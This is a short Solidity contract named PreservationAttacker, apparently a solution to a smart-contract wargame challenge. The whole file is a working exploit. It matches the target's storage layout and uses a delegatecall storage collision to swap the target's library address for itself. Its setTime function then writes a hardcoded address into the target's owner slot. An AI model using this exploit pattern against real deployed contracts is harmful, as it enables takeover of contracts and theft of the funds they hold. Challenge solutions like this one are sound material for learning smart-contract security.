// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PreservationContract.sol";

contract PreservationAttacker {

    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    PreservationContract public preservation;

    constructor(PreservationContract _preservation) {
        preservation = PreservationContract(_preservation);
    }

    function attack() public {
        preservation.setSecondTime(uint(uint160(address(this))));
        preservation.setFirstTime(1);
    }

    function setTime(uint _num) public {
        owner = address(0x09642E5eef9d14E5C9E14610D2097d6DcCCfDA59);
    }
}
